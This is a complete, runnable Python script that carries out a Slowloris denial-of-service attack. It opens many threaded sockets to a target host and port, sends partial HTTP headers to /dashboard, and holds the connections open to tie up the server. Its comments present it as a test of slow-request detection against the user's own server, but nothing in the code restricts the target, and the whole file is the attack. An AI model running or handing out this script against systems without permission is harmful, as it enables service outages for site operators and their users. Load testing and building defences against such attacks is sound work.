import socket
import time
import argparse
import threading

# Slowloris Attack Script
# Sends partial HTTP headers slowly to keep connections open, testing slow request detection
# Usage: python slowloris.py --host <your-server-ip> --port 80 --sockets 50 --delay 10

def slowloris_socket(host, port, delay):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(4)
        sock.connect((host, port))
        sock.send(f"GET /dashboard HTTP/1.1\r\nHost: {host}\r\n".encode())
        sock.send(b"X-a: b\r\n")
        print(f"Opened socket to {host}:{port}")
        time.sleep(delay)  # Keep connection open
        sock.send(b"\r\n")
        sock.close()
    except socket.error as e:
        print(f"Socket error: {e}")

def main():
    parser = argparse.ArgumentParser(description="Slowloris Attack Simulator")
    parser.add_argument("--host", required=True, help="Target host (e.g., <your-server-ip>)")
    parser.add_argument("--port", type=int, default=80, help="Target port")
    parser.add_argument("--sockets", type=int, default=50, help="Number of sockets to open")
    parser.add_argument("--delay", type=int, default=10, help="Delay between header sends (seconds)")
    args = parser.parse_args()

    print(f"Starting Slowloris attack on {args.host}:{args.port} with {args.sockets} sockets...")
    threads = []
    for _ in range(args.sockets):
        thread = threading.Thread(target=slowloris_socket, args=(args.host, args.port, args.delay))
        threads.append(thread)
        thread.start()
    for thread in threads:
        thread.join()
    print("Attack completed.")

if __name__ == "__main__":
    main()